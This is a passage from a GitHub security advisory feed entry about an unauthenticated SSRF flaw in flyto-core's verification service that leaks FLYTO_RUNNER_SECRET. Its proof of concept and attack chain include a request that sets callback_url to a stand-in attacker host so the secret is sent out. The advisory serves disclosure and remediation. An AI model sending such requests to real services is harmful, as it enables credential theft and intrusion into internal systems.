<li><code>target_allowed</code> only gates <code>params.target_url</code> (<code>:259</code>), never <code>callback_url</code>. No <code>validate_url_*</code> anywhere in the file.</li>
<li><code>Dockerfile.verification</code> CMD = <code>main('0.0.0.0', 8344)</code>; entrypoint <code>flyto-verification</code> in <code>pyproject.toml:107</code> → the shipped image binds all interfaces by default.</li>
</ul>
<h2 id="impact">Impact</h2>
<p>Unauthenticated (PR:N) readable SSRF to internal/cloud-metadata with a controlled body (C:H, S:C), plus theft of <code>FLYTO_RUNNER_SECRET</code> to an attacker host → the attacker can then authenticate to the real engine callback endpoint (credential compromise, CWE-522).</p>
<h2 id="proof-of-concept">Proof of Concept</h2>
<p>Code-proven this session (all lines confirmed on v2.26.6):</p>
<pre><code>POST http://&lt;verification-host&gt;:8344/run
{"workflowYaml":"...","params":{...},"callback_url":"http://attacker.tld/collect"}
# -&gt; service POSTs to attacker.tld with header X-Internal-Key: &lt;FLYTO_RUNNER_SECRET&gt;
# Or callback_url=http://&lt;cloud-metadata-ip&gt;/... for internal SSRF with a controlled body.
</code></pre>
<h2 id="attack-chain">Attack Chain</h2>
<ol>
<li>Entry: unauthenticated <code>POST http://&lt;host&gt;:8344/run</code> with <code>callback_url:"http://attacker.tld/collect"</code>. Guard: auth on <code>/run</code>. Bypass proof: no <code>Depends(require_auth)</code> (verification_service.py:363-364); Dockerfile binds all interfaces on port 8344.</li>
<li>Check: <code>target_allowed</code> scope (:259). Bypass proof: only inspects <code>params.target_url</code>; <code>callback_url</code> is never passed through <code>extract_host</code>/<code>target_allowed</code>.</li>
<li>Check: SSRF validation on <code>callback_url</code>. Bypass proof: file has ZERO <code>validate_url</code> references.</li>
<li>Sink: <code>post_callback</code> → <code>session.post(callback_url, json=payload, headers={"X-Internal-Key": FLYTO_RUNNER_SECRET})</code> (:330-335); header attached unconditionally when the env var is set (:327-329).</li>
<li>Impact: (a) SSRF to the cloud metadata IP / internal with a controlled JSON body; (b) exfiltration of FLYTO_RUNNER_SECRET → replay to authenticate to the real engine callback endpoint.</li>
</ol>
<h2 id="bypass-evidence">Bypass Evidence</h2>
<p><code>/run</code> has no auth dependency (grep-confirmed); <code>resolve_callback_url</code> returns the client value verbatim; <code>X-Internal-Key</code> attached unconditionally; <code>target_allowed</code> gates only <code>params.target_url</code>; no <code>validate_url_*</code> in the file; shipped Dockerfile binds all interfaces.</p>
<h2 id="affected-versions">Affected Versions</h2>
<p><code>&lt;= 2.26.6</code> — <code>verification_service.py</code>, <code>pyproject.toml:107</code> entrypoint, and <code>Dockerfile.verification</code> present on latest release tag.</p>
<h2 id="suggested-fix">Suggested Fix</h2>
<p>Add authentication to <code>/run</code>; run <code>callback_url</code> through the SSRF guard + host allowlist before attaching any internal header; do not attach <code>X-Internal-Key</code> to non-allowlisted destinations; bind the service to loopback by default.</p>
<h2 id="credit">Credit</h2>
<p>Vulnerability discovered by zx (Jace).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/flytohub/flyto-core/security/advisories/GHSA-jx74-cqjv-2c67">https://github.com/flytohub/flyto-core/security/advisories/GHSA-jx74-cqjv-2c67</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-67426">https://nvd.nist.gov/vuln/detail/CVE-2026-67426</a></li>
<li><a href="https://github.com/flytohub/flyto-core/commit/0a0a528520ec18f5a21f1ddf858a71cc1edfb6e9">https://github.com/flytohub/flyto-core/commit/0a0a528520ec18f5a21f1ddf858a71cc1edfb6e9</a></li>
<li><a href="https://github.com/flytohub/flyto-core/releases/tag/v2.26.7">https://github.com/flytohub/flyto-core/releases/tag/v2.26.7</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/flyto-core/PYSEC-2026-3571.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/flyto-core/PYSEC-2026-3571.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-jx74-cqjv-2c67">https://github.com/advisories/GHSA-jx74-cqjv-2c67</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jx74-cqjv-2c67</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-07-30T14:47:41.000Z</published>
    </entry>
</feed>